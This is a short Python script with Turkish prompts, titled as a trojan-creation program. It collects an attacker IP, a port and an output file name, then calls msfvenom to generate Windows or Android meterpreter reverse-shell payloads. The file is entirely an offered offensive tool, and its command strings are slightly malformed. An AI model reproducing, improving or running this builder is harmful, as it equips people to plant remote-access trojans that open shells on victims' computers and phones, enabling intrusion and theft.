#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Trojan Olusturma")
print("code by @blody")
print("""
Trojan Oluşturma Programına Hoş Geldiniz.
""")

ip = input("Local veya Dış İp Girin: ")
port = input("Port Girin: ")
print(""" 
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/revers_http
3) android/meterpreter/reverse_tcp
""")
payload = input("Payload No Girin: ")
dosyaisim = input("Oluşturulacak Dosyanın İsmini Giriniz(uzantısıyla beraber): ")
kayityeri = input("Kayıt Yeri Girin(sonuna / ekleyecek şekilde): ")

if(payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + "R" ">" + kayityeri + dosyaisim)
	
if(payload == "2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + "R" ">" + kayityeri + dosyaisim)

if(payload == "3"):
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + "R" ">" + kayityeri + dosyaisim)
